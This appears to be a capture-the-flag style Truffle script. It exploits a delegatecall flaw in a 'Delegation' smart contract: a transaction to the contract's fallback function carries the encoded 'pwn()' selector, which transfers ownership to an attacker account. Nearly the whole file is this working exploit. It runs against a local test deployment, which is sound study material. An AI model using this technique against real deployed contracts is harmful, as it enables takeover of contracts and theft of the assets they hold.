const DelegationContract = artifacts.require('Delegation')
const assert = require('assert')

/**
 * We have to claim ownership over the Delegation contract.
 * The vulnerability is based on the usage of 'delegatecall'.
 * 
 * Some help on how 'delegatecall' works:
 * - https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall
 * - https://ethereum.stackexchange.com/questions/8120/how-does-the-delegatecall-method-work-to-call-to-another-contracts-method
 * 
 * So, by using the fallback function of Delegation.sol, we should be able to call the 'pwn' function of Delegate.sol,
 * which should change the owner of the Delegation.sol contract.
 */
async function execute(callback) {

    // Instance the Delegation contract
    let delegationContract = await DelegationContract.deployed()
    
    // Get the attacker account
    let attackerAccount = web3.eth.accounts[1]
    console.log(`Attacker address: ${attackerAccount}`)

    // Check who's the owner of the Delegation contract
    let owner = await delegationContract.owner.call()
    console.log(`Initial owner: ${owner}`)

    // Call fallback function, sending the call to 'pwn' as the data.
    // To do so, we need to ABI encode the function signature.
    // See http://solidity.readthedocs.io/en/latest/abi-spec.html#function-selector for a detailed explanation.
    await delegationContract.sendTransaction({
        from: attackerAccount,
        data: encodeFunctionSignature('pwn()')
    })
    
    // Check who's the owner of the Delegation contract
    owner = await delegationContract.owner.call()
    assert.equal(owner, attackerAccount)
    console.log(`Final owner: ${owner}`)

    callback()
}

/**
 * Encodes the function name to its ABI representation, which are the first 4 bytes of the sha3 of the function name including types.
 * Based on https://github.com/ethereum/web3.js/blob/1.0/packages/web3-eth-abi/src/index.js#L199
 * @method encodeFunctionSignature
 * @param {String} functionName
 * @return {String} encoded function name
 */
function encodeFunctionSignature(functionName) {
    return web3.sha3(functionName).slice(0, 10)
}

module.exports = execute